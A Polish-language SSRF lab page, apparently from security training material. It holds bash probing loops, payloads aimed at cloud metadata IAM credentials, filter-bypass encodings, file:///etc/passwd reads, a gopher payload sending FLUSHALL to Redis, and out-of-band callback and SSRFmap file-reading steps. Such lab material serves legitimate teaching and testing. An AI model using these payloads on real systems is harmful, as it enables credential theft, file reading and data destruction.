---
title: A10 — SSRF (Server-Side Request Forgery)
sidebar_position: 9
tags: [lab, owasp-a10, ssrf, cloud]
---

# A10 — SSRF (Server-Side Request Forgery)

## Zakres laboratorium

- Odkrywanie parametrów SSRF — identyfikacja parametrów akceptujących adresy URL
- Sondowanie sieci wewnętrznej — localhost, prywatne adresy IP, endpointy metadanych chmury
- Payloady omijania filtrów — sztuczki z kodowaniem do omijania zabezpieczeń SSRF
- Wykrywanie out-of-band (OOB) — potwierdzanie blind SSRF przez callbacki DNS

## Konfiguracja

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Ćwiczenie 1: Odkrywanie parametrów SSRF

Sonduj popularne nazwy parametrów, które zazwyczaj przyjmują adresy URL lub ścieżki do zasobów:

```bash
SSRF_PARAMS=(
  url uri link src source path dest redirect target
  fetch load resource proxy callback webhook endpoint
  import download host from to image preview imageUrl
  file ref
)

TEST_URL="http://127.0.0.1"

for PARAM in "${SSRF_PARAMS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    "$TARGET/api/fetch?$PARAM=$TEST_URL")
  echo "$PARAM: $RESPONSE"
done
```

Testuj również bezpośrednio typowe endpointy podatne na SSRF:

```bash
ENDPOINTS=(
  "/api/fetch?url="
  "/preview?link="
  "/image?src="
  "/proxy?target="
)

for ENDPOINT in "${ENDPOINTS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT$TEST_URL")
  echo "$ENDPOINT: HTTP $RESPONSE"
done
```

## Ćwiczenie 2: Biblioteka payloadów wewnętrznych

### Warianty localhost

```bash
LOCALHOST_PAYLOADS=(
  "http://127.0.0.1/"
  "http://localhost/"
  "http://[::1]/"
  "http://0.0.0.0/"
)
```

### Zakresy prywatnych sieci

```bash
INTERNAL_PAYLOADS=(
  "http://192.168.1.1/"
  "http://10.0.0.1/"
  "http://172.16.0.1/"
)
```

### Endpointy metadanych chmury

```bash
# AWS EC2 Instance Metadata Service (IMDSv1)
"http://169.254.169.254/latest/meta-data/"

# AWS — pobierz dane uwierzytelniające roli IAM (wysoki wpływ)
"http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP — wymaga nagłówka Metadata-Flavor (może być zablokowany)
"http://metadata.google.internal/computeMetadata/v1/"

# Azure IMDS
"http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Sondowanie wewnętrznych usług

```bash
INTERNAL_SERVICES=(
  "http://127.0.0.1:6379/"    # Redis
  "http://127.0.0.1:5432/"    # PostgreSQL
  "http://127.0.0.1:27017/"   # MongoDB
  "http://127.0.0.1:9200/"    # Elasticsearch
  "http://127.0.0.1:2375/"    # Docker daemon (nieuwierzytelnione API)
  "http://127.0.0.1:8080/"    # Typowe wewnętrzne HTTP
  "http://127.0.0.1:8443/"    # Typowe wewnętrzne HTTPS
)
```

## Ćwiczenie 3: Payloady omijania filtrów

Gdy naiwne filtry blokujące `127.0.0.1` lub `localhost`, wypróbuj te alternatywy:

### Warianty kodowania IP (wszystkie rozwiązują się do 127.0.0.1)

| Kodowanie | Wartość |
|-----------|---------|
| Dziesiętne | `http://2130706433/` |
| Szesnastkowe | `http://0x7f000001/` |
| Ósemkowe | `http://0177.0.0.1/` |
| Skrócone | `http://127.1/` |
| Mapowane IPv6 | `http://[::ffff:127.0.0.1]/` |
| Kropki Unicode | `http://127。0。0。1/` |

### Obejścia oparte na DNS

```bash
# nip.io — rozwiązuje *.127.0.0.1.nip.io do 127.0.0.1
"http://127.0.0.1.nip.io/"

# localtest.me — rozwiązuje się do 127.0.0.1
"http://localtest.me/"

# Posiadaj własną domenę wskazującą na 127.0.0.1
"http://ssrf.yourdomain.com/"
```

### Obejścia schematów URL

```bash
# file:// — bezpośredni odczyt lokalnych plików
"file:///etc/passwd"

# dict:// — interakcja z usługami mówiącymi protokołem dict
"dict://127.0.0.1:6379/INFO"

# gopher:// — wysyłanie surowych danych TCP (Redis, Memcached, SMTP)
"gopher://127.0.0.1:6379/_FLUSHALL"
```

## Ćwiczenie 4: Wykrywanie OOB (Blind SSRF)

Gdy odpowiedź SSRF nie odzwierciedla zawartości, użyj callbacków DNS out-of-band, aby potwierdzić podatność.

### interactsh (alternatywa dla Burp Collaborator)

```bash
# Instalacja
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Uruchom listener — generuje unikalny adres URL callback
interactsh-client

# Użyj wygenerowanego URL jako payloadu SSRF
curl -s "$TARGET/api/fetch?url=http://YOUR_UNIQUE_ID.oast.pro/"

# interactsh-client wyświetli callbacki DNS/HTTP, jeśli serwer wykonał żądanie
```

### SSRFmap (automatyczna eksploatacja)

```bash
git clone https://github.com/swisskyrepo/SSRFmap.git /opt/SSRFmap
cd /opt/SSRFmap
pip3 install -r requirements.txt

python3 ssrfmap.py -r request.txt -p url -m readfiles
```

`request.txt` to zapisane żądanie HTTP (np. z Burp) z oznaczonym parametrem SSRF.
